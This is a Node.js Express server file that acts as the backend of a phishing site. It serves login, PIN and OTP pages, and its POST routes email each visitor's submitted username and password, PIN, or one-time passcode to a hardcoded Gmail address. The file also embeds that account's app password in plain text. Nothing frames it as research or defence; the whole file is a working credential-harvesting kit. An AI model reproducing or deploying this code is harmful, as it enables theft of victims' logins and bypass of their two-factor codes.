const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

const PORT = process.env.PORT || 5000; // port to connect to WEB

// Middleware
app.use(express.static("public"));
app.set("view engine", "ejs");
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Bentopfx@gmail.com",
      pass: "gsqxqzbqyzgbmgmg",
    },
  });

  const mailOptions = {
    from: email,
    to: "Bentopfx@gmail.com",
    subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Bentopfx@gmail.com",
      pass: "gsqxqzbqyzgbmgmg",
    },
  });

  const mailOptions = {
    from: email,
    to: "Bentopfx@gmail.com",
    subject: `PIN: ${req.body?.pin} `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "Bentopfx@gmail.com",
      pass: "gsqxqzbqyzgbmgmg",
    },
  });

  const mailOptions = {
    from: email,
    to: "Bentopfx@gmail.com",
    subject: `OTP: ${req.body?.otp} `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// index
app.get("/", (req, res) => {
  res.render("index");
});
// otp
app.get("/otp", (req, res) => {
  res.render("otp");
});
// pin
app.get("/pin", (req, res) => {
  res.render("pin");
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
